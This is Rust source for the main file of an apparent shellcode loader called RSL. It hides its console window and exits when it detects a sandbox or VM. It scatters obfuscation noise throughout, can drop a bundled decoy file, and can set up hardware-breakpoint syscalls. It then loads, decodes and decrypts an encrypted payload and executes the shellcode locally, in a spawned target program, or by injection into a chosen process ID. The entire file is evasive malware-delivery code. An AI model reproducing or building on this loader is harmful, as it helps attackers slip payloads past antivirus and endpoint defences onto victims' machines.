#![cfg_attr(not(feature = "debug"), windows_subsystem = "windows")]
mod utils;
mod load;
mod exec;
mod decrypt;
mod alloc;
mod decode;
mod syscall;
mod api;
#[cfg(feature = "with_bundling")]
mod bundle;
#[cfg(feature = "sandbox")]
mod guard;

use load::load;
use decrypt::decrypt;
use decode::decode;
use exec::exec;
#[cfg(feature = "debug")]
use utils::{print_error, print_message};
use rsl_macros::obfuscation_noise_macro;

fn exit_program() -> ! {
    #[cfg(feature = "hw_syscall")]
    unsafe {
        syscall::hw_syscall::deinit_hw_syscalls();
    }
    #[cfg(feature = "debug")]
    print_message("Exiting program.");
    std::process::exit(1);
}

fn start_program() {
    #[cfg(feature = "hw_syscall")]
    unsafe {
        syscall::hw_syscall::init_hw_syscalls();
    }
    obfuscation_noise_macro!();
    #[cfg(feature = "debug")]
    print_message("RSL started in debug mode.");
}
fn main() {
    start_program();

    #[cfg(feature = "sandbox")]
    if guard::guard_vm() {
        #[cfg(feature = "debug")] 
        print_message("Sandbox/VM detected. Exiting...");
        exit_program();
    } else {
        #[cfg(feature = "debug")] 
        print_message("Pass Sandbox/VM detection.");
    }

    #[cfg(feature = "with_bundling")]
    if let Err(_e) = bundle::bundlefile() {        
        #[cfg(feature = "debug")]        
        print_error("Failed to bundle:", &_e);
        exit_program();
    } else {
        #[cfg(feature = "debug")] 
        print_message("Bundling succeeded.");
        obfuscation_noise_macro!();
    }

    let encrypted_data = match load() {
        Ok(data) => {
            #[cfg(feature = "debug")]
            print_message("Payload loaded successfully.");
            obfuscation_noise_macro!();
            data
        },
        Err(_e) => {
            #[cfg(feature = "debug")]
            print_error("Failed to load:", &_e);
            exit_program();
        }
    };

    let decrypted_data = decode(&encrypted_data).unwrap();

    unsafe {
        let (shellcode_ptr, shellcode_len) = match decrypt(&decrypted_data) {
            Ok(p) => {
                #[cfg(feature = "debug")]
                print_message("Payload decrypted successfully.");
                obfuscation_noise_macro!();
                p
            },
            Err(_e) => {
                #[cfg(feature = "debug")]
                print_error("Failed to decrypt:", &_e);
                exit_program();
            }
        };

        #[cfg(feature = "pattern1")]
        if let Err(_e) = exec(shellcode_ptr as usize, shellcode_len) {
            #[cfg(feature = "debug")]
            print_error("Failed to execute:", &_e);
            exit_program();
        }
        
        #[cfg(feature = "pattern2")] 
        {
            use utils::simple_decrypt;
            let target_program = simple_decrypt(env!("RSL_ENCRYPTED_TARGET_PROGRAM"));

            if let Err(_e) = exec(shellcode_ptr as usize, shellcode_len, target_program.as_str()) {
                #[cfg(feature = "debug")]
                print_error("Failed to execute:", &_e);
                exit_program();
            }
        }
        
        #[cfg(feature = "pattern3")]
        {
            use utils::simple_decrypt;
            let pid: usize = simple_decrypt(env!("RSL_ENCRYPTED_TARGET_PID")).parse().unwrap_or(0);
            
            if let Err(_e) = exec(shellcode_ptr as usize, shellcode_len, pid) {
                #[cfg(feature = "debug")]
                print_error("Failed to execute:", &_e);
                exit_program();
            }
        }
    }
    
    exit_program();
}